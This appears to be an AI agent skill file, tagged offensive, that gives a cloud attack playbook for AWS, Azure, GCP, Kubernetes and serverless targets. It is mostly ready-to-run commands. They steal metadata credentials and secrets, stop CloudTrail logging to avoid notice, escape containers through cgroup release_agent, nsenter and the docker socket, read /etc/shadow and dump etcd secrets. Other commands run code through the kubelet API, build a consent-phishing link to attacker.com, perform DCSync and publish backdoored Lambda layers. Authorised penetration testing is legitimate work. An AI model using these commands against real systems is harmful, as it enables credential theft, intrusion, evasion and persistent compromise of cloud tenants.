---
name: cloud-security
description: Cloud penetration testing — AWS/Azure/GCP privilege escalation, container escape, Kubernetes attacks, serverless exploitation, IaC misconfigurations
metadata:
  type: offensive
  phase: exploitation
  tools: pacu, prowler, scoutsuite, trivy, kubectl, aws-cli, az-cli, gcloud, cloudfox, peirates
kill_chain:
  phase: [recon, exploit]
  step: [1, 4]
  attck_tactics: [TA0043, TA0002, TA0004]
depends_on: [recon-osint]
feeds_into: [exploit-development]
inputs: [cloud_config, iam_policies]
outputs: [cloud_misconfig_list, finding_record, attack_path]
---

# Cloud Security & Attack

## When to Activate

- Cloud infrastructure penetration testing
- AWS/Azure/GCP privilege escalation
- Container and Kubernetes security assessment
- Serverless function exploitation
- IaC (Terraform/CloudFormation) security review
- Cloud credential abuse and lateral movement

## AWS Attacks

### Initial Enumeration
```bash
# Caller identity
aws sts get-caller-identity

# Account enumeration
aws iam list-users
aws iam list-roles
aws iam list-policies --only-attached
aws iam get-account-authorization-details  # full dump

# S3 enumeration
aws s3 ls
aws s3 ls s3://bucket-name --recursive
aws s3api get-bucket-acl --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name

# EC2
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn]'

# Lambda
aws lambda list-functions
aws lambda get-function --function-name NAME  # includes download link
aws lambda get-policy --function-name NAME
```

### Privilege Escalation
```bash
# Pacu (automated AWS exploitation)
pacu
> import_keys --all
> run iam__enum_permissions
> run iam__privesc_scan
> run iam__bruteforce_permissions

# Common privesc paths:
# iam:CreatePolicyVersion → create admin policy version
# iam:SetDefaultPolicyVersion → activate old permissive version
# iam:AttachUserPolicy → attach AdministratorAccess
# iam:CreateLoginProfile → create console password for any user
# iam:UpdateLoginProfile → change any user's password
# iam:PassRole + lambda:CreateFunction → create Lambda with admin role
# iam:PassRole + ec2:RunInstances → launch EC2 with admin role
# sts:AssumeRole → assume cross-account admin role
# lambda:UpdateFunctionCode → inject code into existing Lambda

# SSRF to IMDS
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns: AccessKeyId, SecretAccessKey, Token
```

### Post-Exploitation
```bash
# Secrets Manager / Parameter Store
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id NAME
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# RDS snapshots (public)
aws rds describe-db-snapshots --snapshot-type public

# CloudTrail disruption (stealth)
aws cloudtrail describe-trails
aws cloudtrail stop-logging --name trail-name  # LOUD but effective
# Better: use regions without CloudTrail, or use API calls that aren't logged
```

## Azure Attacks

### Enumeration
```bash
# Azure AD enumeration
az ad user list
az ad group list
az ad app list
az role assignment list --all

# Resource enumeration
az resource list
az vm list
az storage account list
az keyvault list

# Token from IMDS
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Privilege Escalation
```bash
# Managed Identity abuse
# Any Azure resource with MI can request tokens for other services

# Automation Account RunAs
# Extract certificate → authenticate as service principal

# Key Vault access
az keyvault secret list --vault-name VAULT
az keyvault secret show --vault-name VAULT --name SECRET

# Azure AD Connect (on-prem sync)
# Extract credentials from ADSync database → DCSync

# Consent grant attack
# Illicit consent: trick admin into granting app permissions
# Application with Mail.Read, Files.ReadWrite.All
```

## GCP Attacks

```bash
# Service account enumeration
gcloud iam service-accounts list
gcloud projects get-iam-policy PROJECT_ID

# Metadata server
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Privilege escalation
# iam.serviceAccountKeys.create → create key for any SA
# iam.serviceAccounts.actAs → impersonate service account
# compute.instances.setMetadata → add SSH key to any VM
# deploymentmanager.deployments.create → deploy as project editor

# Storage bucket enumeration
gsutil ls
gsutil ls gs://bucket-name
gsutil cp gs://bucket-name/secret.txt .
```

## Kubernetes Attacks

### Enumeration
```bash
# Check permissions
kubectl auth can-i --list
kubectl get secrets --all-namespaces
kubectl get pods --all-namespaces

# Service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Use with: kubectl --token=$TOKEN --server=https://kubernetes.default.svc

# API server direct
curl -k https://kubernetes.default.svc/api/v1/namespaces/default/secrets \
  -H "Authorization: Bearer $TOKEN"
```

### Exploitation
```bash
# Privileged pod escape
# If privileged: mount host filesystem
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Pod with hostPID/hostNetwork
# Access host processes, network stack

# Writable hostPath mount
# Write to /etc/cron.d/ on host

# Peirates (k8s pentesting tool)
peirates
> get-secrets
> attack-mount-host-filesystem
```

### Container Escape
```bash
# Docker socket mounted
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host

# Privileged container
mount /dev/sda1 /mnt
chroot /mnt

# CVE-based escapes
# CVE-2019-5736 (runc) — overwrite host runc binary
# CVE-2020-15257 (containerd) — abstract socket access
# CVE-2022-0185 — file_system_context heap overflow
```

## IaC Security Review

### Terraform Misconfigurations
```hcl
# Dangerous patterns to flag:
# - Security groups with 0.0.0.0/0 ingress
# - S3 buckets without encryption or public access block
# - IAM policies with "*" actions/resources
# - RDS instances publicly accessible
# - CloudTrail logging disabled
# - KMS keys without rotation
# - Lambda functions with admin roles
```

### Tools
```bash
# Automated scanning
prowler aws --severity critical high
scoutsuite aws
trivy config ./terraform/
checkov -d ./terraform/
tfsec ./terraform/
```

## Advanced: AWS Exploitation Chains

### IMDSv2 Bypass
```bash
# IMDSv2 requires PUT with hop limit=1 — bypass via SSRF in same host
# If SSRF target is on same EC2, hop limit doesn't decrement
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# DNS rebinding to bypass IMDSv2 hop limit from external SSRF
# Attacker DNS resolves to target IP first, then 169.254.169.254
# Browser/HTTP client reuses connection → bypasses hop limit
```

### Lambda → IAM Role Chaining
```bash
# Lambda function with iam:PassRole + lambda:CreateFunction
# Create new Lambda with more privileged role
aws lambda create-function \
  --function-name escalate \
  --runtime python3.11 \
  --role arn:aws:iam::ACCOUNT:role/AdminRole \
  --handler index.handler \
  --zip-file fileb://payload.zip

# Lambda → STS → Cross-account assume
aws sts assume-role --role-arn arn:aws:iam::TARGET_ACCOUNT:role/CrossAccountRole \
  --role-session-name pwned
```

### S3 Confused Deputy
```bash
# Service principal confused deputy via s3:PutBucketPolicy
# Trick AWS service into accessing bucket on your behalf
# Exploit: create bucket with same name as expected by service
# Service writes sensitive data to attacker-controlled bucket

# S3 bucket takeover via dangling CNAME
# 1. Find CNAME pointing to deleted S3 bucket
# 2. Create bucket with same name in any region
# 3. Serve malicious content on victim's subdomain
dig +short subdomain.target.com CNAME
# Returns: target-bucket.s3.amazonaws.com (NoSuchBucket)
aws s3 mb s3://target-bucket
```

### CloudFormation/Terraform State Exploitation
```bash
# Terraform state file contains all secrets in plaintext
aws s3 cp s3://terraform-state-bucket/prod/terraform.tfstate .
cat terraform.tfstate | jq '.resources[].instances[].attributes | select(.password != null)'

# CloudFormation exports (cross-stack references)
aws cloudformation list-exports
# Often contains VPC IDs, subnet IDs, security group IDs, RDS endpoints
```

### Cognito Identity Pool Misconfiguration
```bash
# Unauthenticated role assumption via misconfigured identity pool
aws cognito-identity get-id --identity-pool-id REGION:POOL_ID
aws cognito-identity get-credentials-for-identity --identity-id REGION:ID
# Returns temporary credentials — check what IAM role allows
```

## Advanced: Azure/Entra ID Attack Paths

### Azure AD Connect Exploitation
```powershell
# Extract credentials from ADSync database (requires local admin on AADConnect server)
# Method 1: Direct DB query
sqlcmd -S "(localdb)\.\ADSync" -Q "SELECT private_key_xml, machine_key FROM mms_server_configuration"

# Method 2: AADInternals
Install-Module AADInternals
Get-AADIntSyncCredentials
# Returns: domain admin credentials used for sync

# Method 3: DCSync with extracted creds
impacket-secretsdump -just-dc domain/MSOL_USER:PASSWORD@DC_IP
```

### Managed Identity Token Theft
```bash
# From compromised Azure VM/App Service/Function
# System-assigned MI
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"

# Use token to enumerate and pivot
az login --identity
az role assignment list --all --query "[?principalId=='MI_OBJECT_ID']"
```

### Illicit Consent Grant
```
# 1. Register multi-tenant app with dangerous permissions
#    - Mail.Read, Files.ReadWrite.All, User.Read.All
# 2. Send phishing link to admin:
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=ATTACKER_APP_ID&
  response_type=code&
  redirect_uri=https://attacker.com/callback&
  scope=https://graph.microsoft.com/.default&
  prompt=consent
# 3. Admin grants consent → attacker has persistent access to tenant data
```

### Service Principal Certificate Auth
```bash
# If you can read Key Vault or find .pfx file
# Authenticate as service principal without password
az login --service-principal -u APP_ID -p certificate.pem --tenant TENANT_ID

# Or via MSAL
from msal import ConfidentialClientApplication
app = ConfidentialClientApplication(APP_ID, authority=f"https://login.microsoftonline.com/{TENANT}",
  client_credential={"private_key": open("key.pem").read(), "thumbprint": THUMBPRINT})
token = app.acquire_token_for_client(scopes=["https://graph.microsoft.com/.default"])
```

## Advanced: Kubernetes Exploitation

### Pod Escape via /proc
```bash
# From container with hostPID=true
# Find host process, access its root filesystem
ls /proc/1/root/  # host filesystem via PID 1 (init)
cat /proc/1/root/etc/shadow
chroot /proc/1/root /bin/bash

# From container with CAP_SYS_PTRACE
# Inject into host process
nsenter -t 1 -m -u -i -n -p -- /bin/bash
```

### Kubelet API Exploitation (10250/tcp)
```bash
# Unauthenticated kubelet API
# List pods
curl -sk https://NODE_IP:10250/pods | jq '.items[].metadata.name'

# Execute commands in any pod
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER -d "cmd=id"

# Get service account tokens from all pods
for pod in $(curl -sk https://NODE_IP:10250/pods | jq -r '.items[].metadata.name'); do
  curl -sk "https://NODE_IP:10250/run/default/$pod/app" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
done
```

### etcd Direct Access
```bash
# If etcd is exposed (2379/tcp) without auth
ETCDCTL_API=3 etcdctl --endpoints=http://ETCD_IP:2379 get / --prefix --keys-only
# Get all secrets
ETCDCTL_API=3 etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets --prefix
```

### Container Escape Techniques
```bash
# CVE-2024-21626 (runc process.cwd breakout)
# Exploit: set working directory to /proc/self/fd/N pointing to host
# Requires: ability to create container with specific cwd

# cgroup escape (notify_on_release)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo "id > /output" >> /cmd && chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output

# OverlayFS escape (requires CAP_SYS_ADMIN)
unshare -m -p --fork /bin/bash
mount -t overlay overlay -o lowerdir=/,upperdir=/tmp/upper,workdir=/tmp/work /mnt
# /mnt now has full host filesystem
```

## Advanced: Serverless Exploitation

### Lambda Environment Variable Extraction
```bash
# Lambda env vars often contain secrets
aws lambda get-function-configuration --function-name TARGET \
  --query 'Environment.Variables'
# Common secrets: DB_PASSWORD, API_KEY, JWT_SECRET, AWS_ACCESS_KEY_ID

# From inside Lambda execution
env | grep -i key
env | grep -i secret
env | grep -i password
cat /proc/self/environ | tr '\0' '\n'
```

### Event Injection
```bash
# S3 trigger manipulation — upload file that triggers Lambda with malicious event
aws s3 cp malicious.json s3://trigger-bucket/
# Lambda processes file content as trusted input → injection

# SNS/SQS poisoning
aws sqs send-message --queue-url QUEUE_URL \
  --message-body '{"action":"delete","target":"*"}' 
# If Lambda trusts message content without validation → arbitrary actions

# API Gateway event injection
# Manipulate headers/query params that become Lambda event fields
curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Original-URL: /admin" \
     https://api-gw.execute-api.region.amazonaws.com/prod/endpoint
```

### Lambda Layer Poisoning
```bash
# Shared Lambda layers — if you can publish a layer version
# Inject backdoor into commonly-used layer
aws lambda publish-layer-version \
  --layer-name common-utils \
  --zip-file fileb://backdoored-layer.zip \
  --compatible-runtimes python3.11

# All functions using this layer now execute backdoor code
# Layer code runs before function handler
```
